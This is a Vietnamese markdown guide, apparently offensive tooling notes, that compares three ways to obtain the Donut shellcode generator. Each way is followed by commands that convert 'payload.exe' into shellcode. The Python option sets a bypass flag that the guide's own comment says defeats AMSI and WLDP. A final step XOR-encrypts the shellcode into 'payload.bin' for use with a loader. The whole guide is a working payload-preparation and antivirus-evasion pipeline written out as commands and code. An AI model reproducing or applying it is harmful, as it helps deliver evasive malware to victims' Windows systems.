# Donut — 3 cách dùng, chọn 1

## So sánh nhanh

| | Option 1 (Fix build) | Option 2 (Python) | Option 3 (Prebuilt) |
|---|---|---|---|
| Độ phức tạp | Trung bình | Dễ nhất | Dễ |
| Phụ thuộc | GCC, make | Python3, pip | Không |
| Khuyến nghị | Nếu muốn build từ source | **Nhanh nhất** | Nếu không có pip |

---

## OPTION 1 — Fix lỗi build từ source

```bash
# Clone repo
git clone https://github.com/TheWover/donut
cd donut

# Build với flag tắt warning use-after-free
make CFLAGS="-Wno-use-after-free"

# Kiểm tra
./donut --help

# Convert payload
./donut -i payload.exe -o shell_donut.bin -a 2 -f 1
```

---

## OPTION 2 — Python package (Khuyến nghị)

```bash
# Cài package
pip3 install donut-shellcode

# Convert payload — tạo file convert.py
cat > convert.py << 'EOF'
import donut

shellcode = donut.create(
    file   = "payload.exe",   # file .exe cần convert
    arch   = 2,               # 2 = x64
    bypass = 3,               # 3 = bypass AMSI + WLDP
    exit_opt = 1,             # 1 = exit thread sau khi chạy xong
)

open("shell_donut.bin", "wb").write(shellcode)
print("[+] Done:", len(shellcode), "bytes")
EOF

# Chạy
python3 convert.py
```

---

## OPTION 3 — Prebuilt binary

```bash
# Download bản build sẵn
wget https://github.com/TheWover/donut/releases/download/v1.0/donut_v1.0_linux.tar.gz

# Giải nén
tar -xf donut_v1.0_linux.tar.gz

# Cấp quyền chạy
chmod +x donut

# Kiểm tra
./donut --help

# Convert payload
./donut -i payload.exe -o shell_donut.bin -a 2 -f 1
```

---

## Sau khi có shell_donut.bin — XOR encrypt (chung cho cả 3 option)

```bash
python3 -c "
key  = b'mykey123'
data = open('shell_donut.bin','rb').read()
enc  = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
open('payload.bin','wb').write(enc)
print('[+] Encrypted:', len(enc), 'bytes → payload.bin')
"
```

> Sau bước này dùng `payload.bin` như bình thường với loader.
